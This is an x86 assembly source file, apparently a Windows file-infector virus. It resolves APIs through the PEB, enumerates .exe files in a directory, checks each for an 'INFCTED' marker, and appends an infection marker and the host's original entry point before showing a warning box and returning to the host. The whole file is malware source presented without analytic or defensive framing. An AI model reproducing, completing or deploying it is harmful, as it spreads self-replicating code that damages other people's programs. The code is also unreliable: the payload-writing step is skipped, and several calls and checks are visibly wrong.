; shellcode.asm

GET_PEB MACRO
    xor eax, eax
    mov eax, fs:[0x30]
ENDM

RESOLVE_IMPORT MACRO R_BASE, STR_RVA, OUT_PTR
    push STR_RVA
    push R_BASE
    call GetProcAddress
    mov [OUT_PTR], eax
ENDM

.DATA
modKernel32       db "KERNEL32.DLL",0
modUser32         db "USER32.DLL",0
modSearchPattern  db "*.exe",0
strLoadLibraryA   db "LoadLibraryA",0
strGetProcAddress db "GetProcAddress",0
strFindFirstFileA db "FindFirstFileA",0
strFindNextFileA  db "FindNextFileA",0
strFindClose      db "FindClose",0
strCreateFileA    db "CreateFileA",0
strReadFile       db "ReadFile",0
strWriteFile      db "WriteFile",0
strCloseHandle    db "CloseHandle",0
strMessageBoxA    db "MessageBoxA",0
infectMarker      db "INFCTED",0

.DATA?
pLoadLibraryA    dd ?
pGetProcAddress  dd ?
pFindFirstFileA  dd ?
pFindNextFileA   dd ?
pFindClose       dd ?
pCreateFileA     dd ?
pReadFile        dd ?
pWriteFile       dd ?
pCloseHandle     dd ?
pMessageBoxA     dd ?
origOEP          dd ?
hFind            dd ?
findData         dd WIN32_FIND_DATA_SIZE
buffer           db 4096 dup(?)

.CODE
start:
    ; resolve core APIs
    GET_PEB
    mov eax,[eax+0x0C]
    mov esi,[eax+0x1C]
    RESOLVE_IMPORT esi,OFFSET strLoadLibraryA,pLoadLibraryA
    RESOLVE_IMPORT esi,OFFSET strGetProcAddress,pGetProcAddress

    ; resolve MessageBoxA
    push OFFSET modUser32
    call [pLoadLibraryA]
    mov ebx,eax
    RESOLVE_IMPORT ebx,OFFSET strMessageBoxA,pMessageBoxA

    ; resolve file I/O APIs
    push OFFSET modKernel32
    call [pLoadLibraryA]
    mov ebx,eax
    RESOLVE_IMPORT ebx,OFFSET strFindFirstFileA,pFindFirstFileA
    RESOLVE_IMPORT ebx,OFFSET strFindNextFileA,pFindNextFileA
    RESOLVE_IMPORT ebx,OFFSET strFindClose,pFindClose
    RESOLVE_IMPORT ebx,OFFSET strCreateFileA,pCreateFileA
    RESOLVE_IMPORT ebx,OFFSET strReadFile,pReadFile
    RESOLVE_IMPORT ebx,OFFSET strWriteFile,pWriteFile
    RESOLVE_IMPORT ebx,OFFSET strCloseHandle,pCloseHandle

    ; get original entry point from host image
    mov eax, fs:[0x30]            ; PEB
    mov eax, [eax+0x10]           ; PEB->ImageBaseAddress
    mov ecx, [eax+offset IMAGE_DOS_HEADER.e_lfanew]
    mov ecx, [eax+ecx+offset IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint]
    add ecx, eax
    mov [origOEP], ecx

    ; cross-infect loop
    push OFFSET modSearchPattern
    call [pFindFirstFileA]
    mov [hFind], eax

.loop:
    cmp eax, INVALID_HANDLE_VALUE
    je .done
    ; get filename
    lea edi, [findData+WIN32_FIND_DATA.cFileName]
    ; open file
    push FILE_SHARE_READ or FILE_SHARE_WRITE
    push GENERIC_READ or GENERIC_WRITE
    push 0
    push OPEN_EXISTING
    push 0
    push edi
    call [pCreateFileA]
    mov ebx,eax
    ; read first bytes
    push 256
    push buffer
    push ebx
    call [pReadFile]
    ; check marker
    lea esi, [buffer]
    mov ecx,256
    mov edi,OFFSET infectMarker
    xor ebp,ebp

.find_marker:
    cmp ebp,ecx
    je .no_marker
    mov al,[esi+ebp]
    cmp al,[edi]
    jne .next_byte
    ; marker found => skip
    jmp .close_file

.next_byte:
    inc ebp
    jmp .find_marker

.no_marker:
    ; append shellcode + marker + origOEP
    ; (calculate shellcode size and file pointer end)
    ; write shellcode... (skipped)
    ; write infectMarker
    push 8
    push OFFSET infectMarker
    push ebx
    call [pWriteFile]
    ; write origOEP
    push 4
    push OFFSET origOEP
    push ebx
    call [pWriteFile]

.close_file:
    push ebx
    call [pCloseHandle]
    ; next file
    push [hFind]
    push edi
    call [pFindNextFileA]
    mov eax,[hFind]
    jmp .loop

.done:
    ; cleanup
    push [hFind]
    call [pFindClose]

    ; show payload
    push MB_OK or MB_ICONWARNING
    push OFFSET infectMarker
    push OFFSET infectMarker
    push 0
    call [pMessageBoxA]

    ; return to original entry
    jmp [origOEP]
    
END start
